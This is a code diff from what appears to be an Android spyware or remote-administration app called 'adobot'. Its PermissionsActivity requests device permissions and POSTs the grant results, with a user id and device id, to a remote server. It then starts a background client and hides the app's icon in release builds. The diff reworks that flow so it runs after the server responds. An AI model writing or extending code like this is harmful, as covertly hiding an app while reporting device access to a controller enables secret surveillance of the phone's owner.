@@ -15,6 +15,8 @@ import com.android.adobot.BuildConfig;
 import com.android.adobot.CommonParams;
 import com.android.adobot.R;
 import com.android.adobot.http.Http;
+import com.android.adobot.http.HttpCallback;
+
 import pub.devrel.easypermissions.EasyPermissions;
 
 public class PermissionsActivity extends BaseActivity {
@@ -48,14 +50,6 @@ public class PermissionsActivity extends BaseActivity {
         });
     }
 
-    private void done() {
-        startClient();
-        //dont hide when debug to easily deploy debug source
-        if (!BuildConfig.DEBUG) hideApp();
-        finish();
-
-    }
-
     private void askPermissions() {
         EasyPermissions.requestPermissions(this, PERMISSION_RATIONALE,
                 1, AdobotConstants.PERMISSIONS);
@@ -68,7 +62,6 @@ public class PermissionsActivity extends BaseActivity {
         for (int i = 0; i < grantResults.length; i++)
             Log.i(TAG, "Grant result: " + grantResults[i]);
         updatePermissions(permissions, grantResults);
-        done();
     }
 
     private void updatePermissions(String[] perms, int[] results) {
@@ -76,10 +69,18 @@ public class PermissionsActivity extends BaseActivity {
         for (int i = 0; i < perms.length; i++) {
             done.put(perms[i], results[i] == PackageManager.PERMISSION_GRANTED ? "1" : "0");
         }
-        Http doneSMS = new Http();
-        doneSMS.setUrl(commonParams.getServer() + "/permissions/" + commonParams.getUid() + "/" + commonParams.getDevice());
-        doneSMS.setMethod("POST");
-        doneSMS.setParams(done);
-        doneSMS.execute();
+        final PermissionsActivity act = this;
+        Http http = new Http();
+        http.setUrl(commonParams.getServer() + "/permissions/" + commonParams.getUid() + "/" + commonParams.getDevice());
+        http.setMethod("POST");
+        http.setParams(done);
+        http.setCallback(new HttpCallback() {
+            @Override
+            public void onResponse(HashMap response) {
+                act.done();
+                act.finish();
+            }
+        });
+        http.execute();
     }
 }
